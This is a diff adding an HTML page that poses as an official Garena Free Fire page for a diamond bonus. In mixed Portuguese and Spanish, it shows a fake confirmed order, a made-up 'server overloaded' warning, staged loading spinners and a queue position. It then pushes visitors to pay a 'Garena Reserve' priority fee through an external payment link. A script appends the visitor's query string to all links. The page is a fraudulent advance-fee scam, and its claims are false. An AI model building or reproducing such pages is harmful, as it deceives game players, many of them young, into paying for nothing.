@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+
+<html lang="pt"><head>
+<script>
+  window.onload = function () {
+    var links = document.getElementsByTagName("a");
+    for (var i = 0, n = links.length; i < n; i++) {
+      if (links[i].href.includes("#")) {
+        continue;
+      }
+
+      var href =
+        links[i].href.trim() +
+        (links[i].href.indexOf("?") > 0 ? "&" : "?") +
+        document.location.search.replace("?", "").toString();
+      links[i].href = href;
+    }
+  };
+</script>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport"/>
+<title>Oficial en vivo®</title>
+<link href="css/products.css" rel="stylesheet"/>
+<link href="css/styles.css" rel="stylesheet"/>
+<link href="css/fonts.css" rel="stylesheet"/>
+<link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0" rel="stylesheet"/>
+<script async="" defer="" src="js/latest.js"></script>
+</head>
+<body>
+<nav class="navbar" style="padding-top: 15px;">
+<div class="menu-icon" style="padding-left: 3%;">
+<img alt="Logo Central Vivara" src="images/LogoRecFF.png" style="height: 5vh;"/>
+</div>
+<div class="logo-central">
+</div>
+<div class="menu-icon" style="padding-right: 3%;">
+<span class="material-symbols-outlined" style="font-size: 30px; padding-right: 10px; color: black">account_circle</span>
+</div>
+</nav>
+<div id="ad1">
+<p style="margin-left: 5%; font-family: 'GellixMedium'; font-size: 22px;">Seus pedidos</p>
+<div class="ad1">
+<div style="margin-left: 3%; margin-right: 3%;">
+<button class="styled-button">
+<div class="icon-container">
+<img alt="Estado de entrega" src="images/LogoGarenaFF.png" style="width: 32px; height: 32px;"/>
+</div>
+<span class="button-text">
+<span class="button-title">#6481749338</span>
+</span>
+</button>
+<div class="entrega-container">
+<div class="entrega-header">
+                        Status
+                    </div>
+<div class="entrega-content">
+<div class="icon-container2">
+<span class="material-symbols-outlined">check</span>
+</div>
+<div class="text-container">
+<div class="entrega-title">ID confirmada exitosamente</div>
+</div>
+</div>
+<div class="entrega-content">
+<div class="icon-container3">
+<span class="material-symbols-outlined">warning</span>
+</div>
+<div class="text-container">
+<div class="entrega-title">Servidor Sobrecarregado</div>
+</div>
+</div>
+</div>
+<p style="text-align: center; margin-left: 3%; margin-right: 3%;">Su identificación fue confirmada exitosamente, pero se encontró un problema pendiente en su pedido. ¡Haga clic a continuación para resolver este problema!</p>
+<div class="button-container" style="padding-bottom: 20px;">
+<button class="styled-button2" onclick="showAd2()">
+<span class="button-text">
+<span class="button-title2">Resolver problema</span>
+</span>
+<span class="material-symbols-outlined" style="font-size: 32px;">arrow_forward_ios</span>
+</button>
+</div>
+</div>
+</div>
+</div>
+<div id="ad2" style="display: none;">
+<p style="margin-left: 5%; font-family: 'GellixMedium'; font-size: 22px;">Problemas no pedido</p>
+<div class="ad2" style="padding-top: 15px; padding-bottom: 15px;">
+<div style="padding-top: 2px;"></div>
+<div class="loading" id="loadingGif">
+<div class="spinner"></div>
+</div>
+<div class="entrega-container hidden" id="text1">
+<div class="entrega-content">
+<div class="icon-container2">
+<span class="material-symbols-outlined">settings</span>
+</div>
+<div class="text-container">
+<div class="entrega-title">Posición en la fila para recibir el Bono Diamante 824 de 1341 jugadores.</div>
+</div>
+</div>
+</div>
+<div class="loading hidden" id="loadingGif2">
+<div class="spinner"></div>
+</div>
+<div class="hidden entrega-container" id="text2" style="margin-top: 15px;">
+<div class="entrega-content">
+<div class="icon-container2" style="background-color: #9D0C21;">
+<span class="material-symbols-outlined">warning</span>
+</div>
+<div class="text-container">
+<div class="entrega-title"> Nuestro servidor está sobrecargado debido a la alta latencia de las solicitudes.</div>
+</div>
+</div>
+</div>
+<div class="loading hidden" id="loadingGif3" style="padding-top: 20px;">
+<div class="spinner"></div>
+</div>
+<div class="hidden entrega-container" id="text3" style="background-color: #9D0C21; margin-top: 15px;">
+<div class="entrega-content">
+<div class="icon-container2" style="background-color: rgb(255, 255, 255);">
+<span class="material-symbols-outlined" style="color: #9D0C21;">priority_high</span>
+</div>
+<div class="text-container">
+<div class="entrega-title" style="color: white">O seu BÔNUS DE DIAMANTES chegará em sua conta em até (15 Dias úteis). Caso deseje prioridade na fila e a liberação imediata do pedido, Será necessário efetuar o pagamento do Garena Reserve uma taxa de prioridade para recebimento do seu produto.</div>
+</div>
+</div>
+</div>
+<div class="button-container hidden" id="finalButton" style="padding-top: 15px;">
+<button class="styled-button2" onclick="window.open('https://go.tribopay.com.br/gNXdvnzZ', '_blank')">
+<span class="button-text">
+<span class="button-title2">Reserva Garena</span>
+</span>
+<span class="material-symbols-outlined" style="font-size: 32px;">arrow_forward_ios</span>
+</button>
+</div>
+<div style="padding-bottom: 2px;"></div>
+</div>
+</div>
+<script src="js/scripts.js"></script>
+</body></html>
